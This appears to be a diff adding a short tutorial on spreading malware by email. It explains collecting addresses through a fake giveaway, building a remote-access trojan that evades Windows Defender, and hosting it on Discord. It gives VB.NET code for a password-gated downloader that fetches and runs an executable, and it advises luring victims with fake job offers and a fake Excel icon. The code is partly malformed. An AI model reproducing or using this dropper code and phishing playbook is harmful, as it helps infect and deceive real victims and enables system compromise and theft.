@@ -1,0 +1,22 @@
+This Is The Eaziest Email Spreading Method
+First of All You Need A List of Emails
+its Easy To Get Those Make A Fake Giveaway Or Some Shit
+Now. After Building Your Stub(rat) Make  sure it can at least bypass win defender
+after that upload it on discord or anyware
+and make a download & execute program in vb.net
+its easy
+But you have to Password Protect it Here is The Code:
+Public Class Form1
+
+    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
+        if Textbox1.text = "The Password you want (send it to the victim thru the email)" Then
+    If Else msgbox("Invalid Password")
+        My.Computer.Network.DownloadFile("url", "C:\downloadedfile.exe")
+        Process.Start("C:\downloadedfile.exe")
+    End Sub
+End Class
+Alright one you build it just send it to the Victim
+Pretend that you are looking for employes
+and make it seem like its an easy job
+you can put a fake excel icon if you want or something
+some people fall for this stuff even in 2022 lol.
